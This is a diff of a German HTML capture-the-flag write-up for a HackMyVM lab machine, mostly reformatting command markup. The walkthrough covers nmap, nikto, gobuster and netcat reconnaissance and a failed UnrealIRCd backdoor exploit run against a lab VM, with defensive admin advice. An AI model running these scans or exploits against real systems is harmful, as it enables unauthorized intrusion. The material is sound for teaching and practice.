@@ -77,13 +77,13 @@
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Befehl `arp-scan -l | grep "PCS" | awk '{print $1}'` wird verwendet, um im lokalen Netzwerk nach Geräten zu suchen.
-- `arp-scan -l`: Sendet ARP-Anfragen an alle Hosts im lokalen Netzwerk und listet die Antworten auf.
-- `| grep "PCS"`: Filtert die Ausgabe von `arp-scan` nach Zeilen, die "PCS" enthalten. "PCS Systemtechnik GmbH" ist oft der Hersteller von Netzwerkkarten für Oracle VirtualBox.
-- `| awk '{print $1}'`: Extrahiert aus den gefilterten Zeilen die erste Spalte, welche die IP-Adresse ist.
-Das Ergebnis `192.168.2.192` ist die identifizierte IP-Adresse des Zielsystems, das vermutlich eine VirtualBox-VM ist.</p>
+<p class="analysis">**Analyse:** Der Befehl <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span> wird verwendet, um im lokalen Netzwerk nach Geräten zu suchen.
+- <span class="command">arp-scan -l</span>: Sendet ARP-Anfragen an alle Hosts im lokalen Netzwerk und listet die Antworten auf.
+- <span class="command">| grep "PCS"</span>: Filtert die Ausgabe von <span class="command">arp-scan</span> nach Zeilen, die "PCS" enthalten. "PCS Systemtechnik GmbH" ist oft der Hersteller von Netzwerkkarten für Oracle VirtualBox.
+- <span class="command">| awk '{print $1}'</span>: Extrahiert aus den gefilterten Zeilen die erste Spalte, welche die IP-Adresse ist.
+Das Ergebnis <span class="command">192.168.2.192</span> ist die identifizierte IP-Adresse des Zielsystems, das vermutlich eine VirtualBox-VM ist.</p>
 <p class="evaluation">**Bewertung:** Die IP-Adresse des Ziels wurde erfolgreich ermittelt. Der Hinweis auf "PCS" bestätigt die Vermutung einer virtuellen Maschine, was für diesen CTF-Kontext typisch ist.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Nachdem die IP-Adresse bekannt ist, sollte als Nächstes ein Eintrag in die `/etc/hosts`-Datei vorgenommen werden, falls ein Hostname bekannt ist oder vermutet wird, um die weitere Arbeit zu erleichtern. Anschließend ist ein detaillierter Portscan auf die IP-Adresse `192.168.2.192` durchzuführen.<br>**Empfehlung (Admin):** Die Verwendung von Netzwerküberwachungstools kann helfen, ungewöhnliche ARP-Scan-Aktivitäten zu erkennen. In größeren Netzwerken kann die Segmentierung die Reichweite solcher Scans einschränken.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Nachdem die IP-Adresse bekannt ist, sollte als Nächstes ein Eintrag in die <span class="command">/etc/hosts</span>-Datei vorgenommen werden, falls ein Hostname bekannt ist oder vermutet wird, um die weitere Arbeit zu erleichtern. Anschließend ist ein detaillierter Portscan auf die IP-Adresse <span class="command">192.168.2.192</span> durchzuführen.<br>**Empfehlung (Admin):** Die Verwendung von Netzwerküberwachungstools kann helfen, ungewöhnliche ARP-Scan-Aktivitäten zu erkennen. In größeren Netzwerken kann die Segmentierung die Reichweite solcher Scans einschränken.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -96,9 +96,9 @@ Das Ergebnis `192.168.2.192` ist die identifizierte IP-Adresse des Zielsystems, 
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Befehl `vi /etc/hosts` öffnet die Hosts-Datei im `vi`-Editor. Der Pentester fügt die Zeile `192.168.2.192   pycrt.hmv` hinzu. Dies mappt den Hostnamen `pycrt.hmv` auf die zuvor entdeckte IP-Adresse `192.168.2.192`. Dies ermöglicht es, das Zielsystem im weiteren Verlauf über den Hostnamen anstelle der IP-Adresse anzusprechen.</p>
+<p class="analysis">**Analyse:** Der Befehl <span class="command">vi /etc/hosts</span> öffnet die Hosts-Datei im <span class="command">vi</span>-Editor. Der Pentester fügt die Zeile <span class="command">192.168.2.192   pycrt.hmv</span> hinzu. Dies mappt den Hostnamen <span class="command">pycrt.hmv</span> auf die zuvor entdeckte IP-Adresse <span class="command">192.168.2.192</span>. Dies ermöglicht es, das Zielsystem im weiteren Verlauf über den Hostnamen anstelle der IP-Adresse anzusprechen.</p>
 <p class="evaluation">**Bewertung:** Ein sinnvoller Schritt, um die Übersichtlichkeit und Handhabung bei den folgenden Befehlen zu verbessern, insbesondere wenn Webanwendungen auf Hostnamen basierende Virtual Hosts verwenden.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Überprüfen Sie die Erreichbarkeit des Hosts über den neu konfigurierten Hostnamen, z.B. mit `ping pycrt.hmv` oder einem `curl`-Request.<br>**Empfehlung (Admin):** Auf administrativen Systemen sollten Änderungen an der `/etc/hosts`-Datei nur von autorisierten Benutzern vorgenommen werden. Die zentrale DNS-Auflösung ist in den meisten Fällen vorzuziehen.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Überprüfen Sie die Erreichbarkeit des Hosts über den neu konfigurierten Hostnamen, z.B. mit <span class="command">ping pycrt.hmv</span> oder einem <span class="command">curl</span>-Request.<br>**Empfehlung (Admin):** Auf administrativen Systemen sollten Änderungen an der <span class="command">/etc/hosts</span>-Datei nur von autorisierten Benutzern vorgenommen werden. Die zentrale DNS-Auflösung ist in den meisten Fällen vorzuziehen.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -142,14 +142,14 @@ Content-Type: text/html
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Befehl `curl -Iv http://pycrt.hmv -s` sendet eine HTTP HEAD-Anfrage an `pycrt.hmv` auf Port 80.
-- `curl`: Ein Kommandozeilentool zum Übertragen von Daten mit URLs.
-- `-I`: Führt eine HTTP HEAD-Anfrage aus (holt nur die Header).
-- `-v`: Verbose-Modus, zeigt detaillierte Informationen über die Verbindung und die Anfrage/Antwort an.
-- `-s`: Silent-Modus, unterdrückt die Fortschrittsanzeige.
-Die Ausgabe bestätigt, dass `pycrt.hmv` korrekt zu `192.168.2.192` aufgelöst wird und eine Verbindung zu Port 80 hergestellt werden kann. Der Server antwortet mit `HTTP/1.1 200 OK` und gibt Header-Informationen zurück, darunter `Server: Apache/2.4.62 (Debian)`. Dies bestätigt, dass ein Apache-Webserver auf dem Ziel läuft.</p>
-<p class="evaluation">**Bewertung:** Dieser Schritt validiert die Erreichbarkeit des Webservers und liefert erste wichtige Informationen über die Server-Software (Apache 2.4.62 auf Debian). Die Statusmeldung `200 OK` zeigt, dass der Webserver aktiv ist und Anfragen beantwortet.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Nachdem die grundlegende Erreichbarkeit des Webservers bestätigt wurde, ist ein umfassender Portscan mit `nmap` der nächste logische Schritt, um alle offenen Ports und Dienste auf dem Zielsystem zu identifizieren, nicht nur den Webserver.<br>**Empfehlung (Admin):** Das `Server`-Header-Feld kann Informationen über die verwendete Webserver-Software und -Version preisgeben. In manchen Sicherheitsrichtlinien wird empfohlen, diesen Header zu minimieren oder zu verschleiern (`ServerTokens Prod` in Apache), um Angreifern weniger direkte Informationen zu liefern, obwohl dies die Sicherheit nur marginal erhöht ("Security through obscurity").</p>
+<p class="analysis">**Analyse:** Der Befehl <span class="command">curl -Iv http://pycrt.hmv -s</span> sendet eine HTTP HEAD-Anfrage an <span class="command">pycrt.hmv</span> auf Port 80.
+- <span class="command">curl</span>: Ein Kommandozeilentool zum Übertragen von Daten mit URLs.
+- <span class="command">-I</span>: Führt eine HTTP HEAD-Anfrage aus (holt nur die Header).
+- <span class="command">-v</span>: Verbose-Modus, zeigt detaillierte Informationen über die Verbindung und die Anfrage/Antwort an.
+- <span class="command">-s</span>: Silent-Modus, unterdrückt die Fortschrittsanzeige.
+Die Ausgabe bestätigt, dass <span class="command">pycrt.hmv</span> korrekt zu <span class="command">192.168.2.192</span> aufgelöst wird und eine Verbindung zu Port 80 hergestellt werden kann. Der Server antwortet mit <span class="password">HTTP/1.1 200 OK</span> und gibt Header-Informationen zurück, darunter <span class="command">Server: Apache/2.4.62 (Debian)</span>. Dies bestätigt, dass ein Apache-Webserver auf dem Ziel läuft.</p>
+<p class="evaluation">**Bewertung:** Dieser Schritt validiert die Erreichbarkeit des Webservers und liefert erste wichtige Informationen über die Server-Software (Apache 2.4.62 auf Debian). Die Statusmeldung <span class="password">200 OK</span> zeigt, dass der Webserver aktiv ist und Anfragen beantwortet.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Nachdem die grundlegende Erreichbarkeit des Webservers bestätigt wurde, ist ein umfassender Portscan mit <span class="command">nmap</span> der nächste logische Schritt, um alle offenen Ports und Dienste auf dem Zielsystem zu identifizieren, nicht nur den Webserver.<br>**Empfehlung (Admin):** Das <span class="command">Server</span>-Header-Feld kann Informationen über die verwendete Webserver-Software und -Version preisgeben. In manchen Sicherheitsrichtlinien wird empfohlen, diesen Header zu minimieren oder zu verschleiern (<span class="command">ServerTokens Prod</span> in Apache), um Angreifern weniger direkte Informationen zu liefern, obwohl dies die Sicherheit nur marginal erhöht ("Security through obscurity").</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -168,7 +168,7 @@ PORT     STATE SERVICE VERSION
 |   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
 |_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
 <span class="command">80/tcp   open  http    Apache httpd 2.4.62 ((Debian))</span>
-|_http-title: Apache2 Debian Default Page: It works
+|_http-title: <span class="command">Apache2 Debian Default Page: It works</span>
 |_http-server-header: Apache/2.4.62 (Debian)
 <span class="command">6667/tcp open  irc</span>
 | irc-info: 
@@ -177,7 +177,7 @@ PORT     STATE SERVICE VERSION
 |   chans: 0
 |   lusers: 1
 |   lservers: 0
-|   server: irc.local
+|   server: <span class="command">irc.local</span>
 |   version: <span class="command">InspIRCd-3. irc.local</span> 
 |   source ident: nmap
 |   source host: 192.168.2.199
@@ -199,14 +199,14 @@ Nmap done: 1 IP address (1 host up) scanned in 18.55 seconds
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Befehl `nmap -sS -sC -sV -p- -T5 -AO pycrt.hmv` führt einen intensiven Scan auf `pycrt.hmv` durch.
-- `-sV`: Versucht, Versionsinformationen der laufenden Dienste zu ermitteln.
-- `-T5`: Setzt das Timing-Template auf "insane" für einen sehr schnellen Scan (kann ungenau sein oder Intrusion Detection Systeme auslösen, aber in CTFs oft verwendet).
-- Die anderen Parameter (`-sS`, `-sC`, `-p-`, `-AO`) wurden bereits im vorherigen Bericht erklärt.
+<p class="analysis">**Analyse:** Der Befehl <span class="command">nmap -sS -sC -sV -p- -T5 -AO pycrt.hmv</span> führt einen intensiven Scan auf <span class="command">pycrt.hmv</span> durch.
+- <span class="command">-sV</span>: Versucht, Versionsinformationen der laufenden Dienste zu ermitteln.
+- <span class="command">-T5</span>: Setzt das Timing-Template auf "insane" für einen sehr schnellen Scan (kann ungenau sein oder Intrusion Detection Systeme auslösen, aber in CTFs oft verwendet).
+- Die anderen Parameter (<span class="command">-sS, -sC, -p-, -AO</span>) wurden bereits im vorherigen Bericht erklärt.
 Der Scan identifiziert drei offene TCP-Ports:
-- `22/tcp`: SSH, OpenSSH 8.4p1 Debian.
-- `80/tcp`: HTTP, Apache httpd 2.4.62 (Debian), mit dem Titel "Apache2 Debian Default Page: It works".
-- `6667/tcp`: IRC, identifiziert als InspIRCd-3 auf `irc.local`. Die `irc-info`-Skriptausgabe liefert einige Details, aber auch einen Fehler ("Client exited").
+- Port <span class="command">22/tcp</span>: SSH, OpenSSH 8.4p1 Debian.
+- Port <span class="command">80/tcp</span>: HTTP, Apache httpd 2.4.62 (Debian), mit dem Titel "Apache2 Debian Default Page: It works".
+- Port <span class="command">6667/tcp</span>: IRC, identifiziert als InspIRCd-3 auf <span class="command">irc.local</span>. Die <span class="command">irc-info</span>-Skriptausgabe liefert einige Details, aber auch einen Fehler ("Client exited").
 Zusätzlich werden Betriebssystemdetails (Linux 4.X/5.X, möglicherweise OpenWrt) und die MAC-Adresse (VirtualBox) bestätigt.</p>
 <p class="evaluation">**Bewertung:** Dieser Scan liefert eine umfassende Übersicht der Angriffsfläche. Neben dem bereits bekannten Webserver (Port 80) sind nun auch SSH (Port 22) und ein IRC-Server (Port 6667) als potenzielle Ziele identifiziert. Die Information "Apache2 Debian Default Page" auf Port 80 deutet darauf hin, dass möglicherweise keine benutzerdefinierte Webanwendung direkt im Web-Root liegt, sondern vielleicht in Unterverzeichnissen oder dass die Standardseite nicht geändert wurde. Der IRC-Dienst ist ein interessanter, weniger häufiger Angriffsvektor.</p>
 <p class="recommendation">**Empfehlung (Pentester):** Jeder der offenen Ports sollte weiter untersucht werden:
@@ -227,7 +227,7 @@ Zusätzlich werden Betriebssystemdetails (Linux 4.X/5.X, möglicherweise OpenWrt
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Dieser Befehl wiederholt den vorherigen `nmap`-Scan, leitet die Ausgabe aber durch `grep open`, um nur die Zeilen anzuzeigen, die das Wort "open" enthalten. Dies dient dazu, eine schnelle, saubere Liste der offenen Ports zu erhalten.</p>
+<p class="analysis">**Analyse:** Dieser Befehl wiederholt den vorherigen <span class="command">nmap</span>-Scan, leitet die Ausgabe aber durch <span class="command">grep open</span>, um nur die Zeilen anzuzeigen, die das Wort "open" enthalten. Dies dient dazu, eine schnelle, saubere Liste der offenen Ports zu erhalten.</p>
 <p class="evaluation">**Bewertung:** Eine nützliche Methode, um die Scan-Ergebnisse schnell zusammenzufassen und sich auf die relevanten offenen Ports zu konzentrieren.</p>
 <p class="recommendation">**Empfehlung (Pentester):** Keine spezifische neue Empfehlung, da dies nur eine andere Darstellung des vorherigen Ergebnisses ist. Die Strategie bleibt die Untersuchung der drei offenen Ports.<br>**Empfehlung (Admin):** Keine spezifische neue Empfehlung.</p>
         </section>
@@ -261,15 +261,15 @@ Zusätzlich werden Betriebssystemdetails (Linux 4.X/5.X, möglicherweise OpenWrt
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Befehl `nikto -h http://192.168.2.192` führt einen Webserver-Scan mit Nikto durch. Nikto ist ein Scanner, der auf bekannte Webserver-Schwachstellen, Fehlkonfigurationen und interessante Dateien/Verzeichnisse prüft.
+<p class="analysis">**Analyse:** Der Befehl <span class="command">nikto -h http://192.168.2.192</span> führt einen Webserver-Scan mit Nikto durch. Nikto ist ein Scanner, der auf bekannte Webserver-Schwachstellen, Fehlkonfigurationen und interessante Dateien/Verzeichnisse prüft.
 Die Ausgabe zeigt:
-- Bestätigung des Servers: `Apache/2.4.62 (Debian)`.
-- Fehlende Sicherheitsheader: `X-Frame-Options` (Schutz gegen Clickjacking) und `X-Content-Type-Options` (Schutz gegen MIME-Sniffing-Angriffe) sind nicht gesetzt.
+- Bestätigung des Servers: <span class="command">Apache/2.4.62 (Debian)</span>.
+- Fehlende Sicherheitsheader: <span class="password">X-Frame-Options</span> (Schutz gegen Clickjacking) und <span class="password">X-Content-Type-Options</span> (Schutz gegen MIME-Sniffing-Angriffe) sind nicht gesetzt.
 - Potenzielles Inode-Leak über ETags (CVE-2003-1418): Dies ist eine ältere Schwachstelle, die unter Umständen Rückschlüsse auf die interne Dateistruktur erlauben könnte, aber oft von geringer praktischer Bedeutung ist.
-- Erlaubte HTTP-Methoden: `GET, POST, OPTIONS, HEAD`. Die `OPTIONS`-Methode kann nützlich sein, um weitere Informationen zu erhalten.
+- Erlaubte HTTP-Methoden: <span class="command">GET, POST, OPTIONS, HEAD</span>. Die <span class="command">OPTIONS</span>-Methode kann nützlich sein, um weitere Informationen zu erhalten.
 - Keine CGI-Verzeichnisse gefunden (mit Standardtests).</p>
 <p class="evaluation">**Bewertung:** Nikto hat einige informative, aber meist risikoarme Befunde geliefert. Das Fehlen von Sicherheitsheadern ist eine gängige, aber eher geringfügige Schwachstelle. Das ETag-Inode-Leak ist alt und selten ausnutzbar. Wichtig ist, dass keine offensichtlichen kritischen Schwachstellen wie veraltete Softwarekomponenten oder exponierte gefährliche Dateien direkt gefunden wurden.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Die fehlenden Sicherheitsheader sollten im Bericht vermerkt werden. Der nächste Schritt in der Web-Enumeration ist das Suchen nach versteckten Verzeichnissen und Dateien mit Tools wie Gobuster oder Feroxbuster, da Nikto hier keine spezifischen Verzeichnisse gefunden hat.<br>**Empfehlung (Admin):** Implementieren Sie die fehlenden Sicherheitsheader (`X-Frame-Options: DENY` oder `SAMEORIGIN`, `X-Content-Type-Options: nosniff`), um die Sicherheit der Webanwendung zu erhöhen. Die ETag-Konfiguration kann überprüft werden, um das Inode-Leak zu verhindern, falls gewünscht (z.B. `FileETag None` in Apache).</p>
+<p class="recommendation">**Empfehlung (Pentester):** Die fehlenden Sicherheitsheader sollten im Bericht vermerkt werden. Der nächste Schritt in der Web-Enumeration ist das Suchen nach versteckten Verzeichnissen und Dateien mit Tools wie Gobuster oder Feroxbuster, da Nikto hier keine spezifischen Verzeichnisse gefunden hat.<br>**Empfehlung (Admin):** Implementieren Sie die fehlenden Sicherheitsheader (<span class="command">X-Frame-Options: DENY</span> oder <span class="command">SAMEORIGIN</span>, <span class="command">X-Content-Type-Options: nosniff</span>), um die Sicherheit der Webanwendung zu erhöhen. Die ETag-Konfiguration kann überprüft werden, um das Inode-Leak zu verhindern, falls gewünscht (z.B. <span class="command">FileETag None</span> in Apache).</p>
         </section>
         <section id="irc-enumeration">
             <h2>IRC Enumeration &amp; Exploitation Attempts</h2>
@@ -288,11 +288,11 @@ Die Ausgabe zeigt:
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Mit `nc -nv 192.168.2.192 6667` wird versucht, eine manuelle Verbindung zum IRC-Server herzustellen.
-- `nc`: Netcat, ein vielseitiges Netzwerktool.
-- `-n`: Numerische IP-Adressen (kein DNS).
-- `-v`: Verbose-Ausgabe.
-Die Verbindung wird erfolgreich hergestellt (`open`). Der IRC-Server (`irc.local`) versucht, den Hostnamen des Clients aufzulösen, scheitert aber und verwendet stattdessen die IP-Adresse. Kurz darauf wird die Verbindung mit der Meldung `ERROR :Closing link: (...) [Registration timeout]` serverseitig beendet. Dies bedeutet, dass der Client sich nicht innerhalb einer bestimmten Zeitspanne beim IRC-Server registriert hat (typischerweise durch Senden von `NICK`- und `USER`-Befehlen).</p>
+<p class="analysis">**Analyse:** Mit <span class="command">nc -nv 192.168.2.192 6667</span> wird versucht, eine manuelle Verbindung zum IRC-Server herzustellen.
+- <span class="command">nc</span>: Netcat, ein vielseitiges Netzwerktool.
+- <span class="command">-n</span>: Numerische IP-Adressen (kein DNS).
+- <span class="command">-v</span>: Verbose-Ausgabe.
+Die Verbindung wird erfolgreich hergestellt (<span class="password">open</span>). Der IRC-Server (<span class="command">irc.local</span>) versucht, den Hostnamen des Clients aufzulösen, scheitert aber und verwendet stattdessen die IP-Adresse. Kurz darauf wird die Verbindung mit der Meldung <span class="password">ERROR :Closing link: (...) [Registration timeout]</span> serverseitig beendet. Dies bedeutet, dass der Client sich nicht innerhalb einer bestimmten Zeitspanne beim IRC-Server registriert hat (typischerweise durch Senden von <span class="command">NICK</span>- und <span class="command">USER</span>-Befehlen).</p>
 <p class="evaluation">**Bewertung:** Die manuelle Verbindung mit Netcat bestätigt, dass der IRC-Dienst läuft und Verbindungen annimmt, aber eine sofortige Registrierung erwartet. Dies ist normales Verhalten für IRC-Server.</p>
 <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie einen richtigen IRC-Client (wie Irssi, WeeChat) oder spezialisierte Nmap-Skripte, um mit dem IRC-Server zu interagieren und weitere Informationen zu sammeln oder nach Schwachstellen zu suchen. Prüfen Sie, ob eine SSL/TLS-Verbindung erwartet wird.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass der IRC-Server sicher konfiguriert ist, keine bekannten Schwachstellen aufweist und der Zugriff, falls nicht öffentlich gedacht, eingeschränkt ist. Ein Registration-Timeout ist eine normale Sicherheitsmaßnahme.</p>
 
@@ -308,11 +308,11 @@ Connecting to 192.168.2.192
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Befehl `openssl s_client -connect 192.168.2.192:6667 -quiet` versucht, eine SSL/TLS-Verbindung zum IRC-Server auf Port 6667 herzustellen. Die Option `-quiet` unterdrückt die meisten zeremoniellen Ausgaben von `s_client`. Die Fehlermeldungen (`packet length too long`, `record layer failure`) deuten darauf hin, dass der Server auf diesem Port keine SSL/TLS-verschlüsselte Kommunikation erwartet oder dass ein Problem mit dem SSL-Handshake vorliegt, wahrscheinlich weil der Server Plaintext-IRC spricht.</p>
+<p class="analysis">**Analyse:** Der Befehl <span class="command">openssl s_client -connect 192.168.2.192:6667 -quiet</span> versucht, eine SSL/TLS-Verbindung zum IRC-Server auf Port 6667 herzustellen. Die Option <span class="command">-quiet</span> unterdrückt die meisten zeremoniellen Ausgaben von <span class="command">s_client</span>. Die Fehlermeldungen (<span class="password">packet length too long</span>, <span class="password">record layer failure</span>) deuten darauf hin, dass der Server auf diesem Port keine SSL/TLS-verschlüsselte Kommunikation erwartet oder dass ein Problem mit dem SSL-Handshake vorliegt, wahrscheinlich weil der Server Plaintext-IRC spricht.</p>
 <p class="evaluation">**Bewertung:** Es ist nun sehr wahrscheinlich, dass der IRC-Dienst auf Port 6667 unverschlüsselt betrieben wird. Der Versuch, eine SSL-Verbindung zu erzwingen, schlägt fehl.</p>
 <p class="recommendation">**Empfehlung (Pentester):** Konzentrieren Sie sich auf unverschlüsselte IRC-Kommunikation für diesen Port. Verwenden Sie Nmap-Skripte, die auf IRC-Dienste zugeschnitten sind.<br>**Empfehlung (Admin):** Wenn der IRC-Dienst sensible Informationen übertragen könnte, sollte eine Verschlüsselung (IRC over SSL/TLS, oft auf Port 6697) in Betracht gezogen und erzwungen werden.</p>
 
-<p class="comment">Der Pentester recherchiert online (Link zu HackTricks wird angedeutet) nach Informationen zum Pentesting von IRC-Diensten und stößt auf Hinweise zu Standardpasswörtern oder bekannten Schwachstellen.</p>
+<p class="comment">Der Pentester recherchiert online (Link zu HackTricks: [Link: https://book.hacktricks.wiki/sw/network-services-pentesting/pentesting-irc.html | Ziel: https://book.hacktricks.wiki/sw/network-services-pentesting/pentesting-irc.html]) nach Informationen zum Pentesting von IRC-Diensten und stößt auf Hinweise zu Standardpasswörtern oder bekannten Schwachstellen.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -349,14 +349,14 @@ Nmap done: 1 IP address (1 host up) scanned in 65.48 seconds
     </div>
 </div>
 <p class="analysis">**Analyse:** Ein weiterer Nmap-Scan wird gestartet, diesmal spezifisch auf IRC-Ports (194 und der Bereich 6660-7000) und mit IRC-spezifischen NSE-Skripten:
-- `--script irc-botnet-channels,irc-info,irc-unrealircd-backdoor`: Führt Skripte aus, um nach Botnet-Kanälen zu suchen, allgemeine IRC-Informationen zu sammeln und auf die bekannte UnrealIRCd-Backdoor-Schwachstelle zu prüfen.
+- <span class="command">--script irc-botnet-channels,irc-info,irc-unrealircd-backdoor</span>: Führt Skripte aus, um nach Botnet-Kanälen zu suchen, allgemeine IRC-Informationen zu sammeln und auf die bekannte UnrealIRCd-Backdoor-Schwachstelle zu prüfen.
 Die Ergebnisse für Port 6667:
-- `irc-botnet-channels`: Liefert einen Timeout-Fehler, findet also keine offensichtlichen Botnet-Kanäle.
-- `irc-unrealircd-backdoor`: Das Skript meldet, dass der Server die Verbindung geschlossen hat, möglicherweise wegen zu vieler Verbindungsversuche. Dies deutet nicht direkt auf die Backdoor hin, aber das Skript konnte nicht erfolgreich abgeschlossen werden.
-- `irc-info`: Bestätigt erneut InspIRCd-3 und den Hostnamen `irc.local`.
+- <span class="command">irc-botnet-channels</span>: Liefert einen Timeout-Fehler, findet also keine offensichtlichen Botnet-Kanäle.
+- <span class="command">irc-unrealircd-backdoor</span>: Das Skript meldet, dass der Server die Verbindung geschlossen hat, möglicherweise wegen zu vieler Verbindungsversuche. Dies deutet nicht direkt auf die Backdoor hin, aber das Skript konnte nicht erfolgreich abgeschlossen werden.
+- <span class="command">irc-info</span>: Bestätigt erneut InspIRCd-3 und den Hostnamen <span class="command">irc.local</span>.
 Die anderen Ports im gescannten Bereich sind geschlossen.</p>
-<p class="evaluation">**Bewertung:** Die Nmap-Skripte liefern keine direkten Hinweise auf eine einfache Ausnutzung oder kritische Fehlkonfigurationen. Der Timeout bei `irc-botnet-channels` und das Problem mit dem `irc-unrealircd-backdoor`-Skript könnten auf serverseitige Schutzmechanismen oder einfach auf Inkompatibilitäten hindeuten. Die Information, dass es sich um InspIRCd-3 handelt, ist jedoch weiterhin relevant für die Suche nach spezifischen Schwachstellen für diese Version.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Da die Standard-Nmap-Skripte keine eindeutigen Ergebnisse liefern, sollte nach öffentlich bekannten Exploits für InspIRCd-3 gesucht werden. Die Fehlermeldung des `irc-unrealircd-backdoor`-Skripts könnte auch ein Hinweis sein, dass die verwendete IRCd-Version *nicht* UnrealIRCd ist oder dass der Exploit-Versuch erkannt wurde. Eine manuelle Interaktion mit einem IRC-Client könnte tiefere Einblicke geben.<br>**Empfehlung (Admin):** Halten Sie die IRC-Server-Software (InspIRCd) stets auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden. Konfigurieren Sie Ratenbegrenzungen und andere Schutzmechanismen, um automatisierte Scans und Exploit-Versuche zu erschweren.</p>
+<p class="evaluation">**Bewertung:** Die Nmap-Skripte liefern keine direkten Hinweise auf eine einfache Ausnutzung oder kritische Fehlkonfigurationen. Der Timeout bei <span class="command">irc-botnet-channels</span> und das Problem mit dem <span class="command">irc-unrealircd-backdoor</span>-Skript könnten auf serverseitige Schutzmechanismen oder einfach auf Inkompatibilitäten hindeuten. Die Information, dass es sich um InspIRCd-3 handelt, ist jedoch weiterhin relevant für die Suche nach spezifischen Schwachstellen für diese Version.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Da die Standard-Nmap-Skripte keine eindeutigen Ergebnisse liefern, sollte nach öffentlich bekannten Exploits für InspIRCd-3 gesucht werden. Die Fehlermeldung des <span class="command">irc-unrealircd-backdoor</span>-Skripts könnte auch ein Hinweis sein, dass die verwendete IRCd-Version *nicht* UnrealIRCd ist oder dass der Exploit-Versuch erkannt wurde. Eine manuelle Interaktion mit einem IRC-Client könnte tiefere Einblicke geben.<br>**Empfehlung (Admin):** Halten Sie die IRC-Server-Software (InspIRCd) stets auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden. Konfigurieren Sie Ratenbegrenzungen und andere Schutzmechanismen, um automatisierte Scans und Exploit-Versuche zu erschweren.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -403,12 +403,12 @@ id
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Das Python2-Skript für den UnrealIRCd-Exploit wird gegen das Ziel ausgeführt. Das Skript versucht, eine Verbindung herzustellen und eine Payload zu senden, um eine Bind Shell zu erhalten oder Befehle auszuführen (hier wird nach dem Senden der Payload `id` eingegeben, in der Hoffnung auf eine Antwort). Der IRC-Server antwortet mit den üblichen Hostname-Resolution-Nachrichten und schließt dann die Verbindung aufgrund eines `Registration timeout`. Der Exploit scheint keinen Befehl erfolgreich ausgeführt zu haben.</p>
+<p class="analysis">**Analyse:** Das Python2-Skript für den UnrealIRCd-Exploit wird gegen das Ziel ausgeführt. Das Skript versucht, eine Verbindung herzustellen und eine Payload zu senden, um eine Bind Shell zu erhalten oder Befehle auszuführen (hier wird nach dem Senden der Payload <span class="command">id</span> eingegeben, in der Hoffnung auf eine Antwort). Der IRC-Server antwortet mit den üblichen Hostname-Resolution-Nachrichten und schließt dann die Verbindung aufgrund eines <span class="password">Registration timeout</span>. Der Exploit scheint keinen Befehl erfolgreich ausgeführt zu haben.</p>
 <p class="evaluation">**Bewertung:** Wie erwartet, war dieser Exploit nicht erfolgreich. Dies stützt die frühere Nmap-Identifikation von "InspIRCd-3" anstelle von UnrealIRCd. Der Versuch war dennoch legitim im Rahmen einer gründlichen Untersuchung.</p>
 <p class="recommendation">**Empfehlung (Pentester):** Verwerfen Sie die Hypothese der UnrealIRCd-Backdoor. Konzentrieren Sie sich wieder auf die Enumeration des Webservers und die manuelle Interaktion mit dem InspIRCd-Server unter Verwendung eines Standard-IRC-Clients.<br>**Empfehlung (Admin):** Keine spezifische Empfehlung, da der Angriff nicht erfolgreich war. Dies bestätigt jedoch, dass die Verwendung einer anderen IRCd-Software (InspIRCd) vor diesem spezifischen Exploit geschützt hat.</p>
         </section>
 
-        <section id="web-enumeration"> <!-- Fortsetzung der Web Enumeration -->
+        <section id="web-enumeration"> 
             <h2>Web Enumeration (Fortsetzung)</h2>
 <p class="comment">Nachdem die IRC-Untersuchung keine direkten Ergebnisse brachte, kehren wir zur Web-Enumeration zurück, um nach weiteren Inhalten auf dem Apache-Server zu suchen.</p>
 <div class="code-block">
@@ -437,9 +437,9 @@ Starting gobuster in directory enumeration mode
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Ein erneuter `gobuster`-Scan wird auf die Wurzel des Webservers `http://pycrt.hmv` gestartet. Die Parameter sind ähnlich wie zuvor (Wortliste, Ausschluss von Statuscodes, erweiterter Modus). Dieses Mal findet Gobuster nur die `index.html`, die der Apache-Standardseite entspricht.</p>
+<p class="analysis">**Analyse:** Ein erneuter <span class="command">gobuster</span>-Scan wird auf die Wurzel des Webservers <span class="command">http://pycrt.hmv</span> gestartet. Die Parameter sind ähnlich wie zuvor (Wortliste, Ausschluss von Statuscodes, erweiterter Modus). Dieses Mal findet Gobuster nur die <span class="command">index.html</span>, die der Apache-Standardseite entspricht.</p>
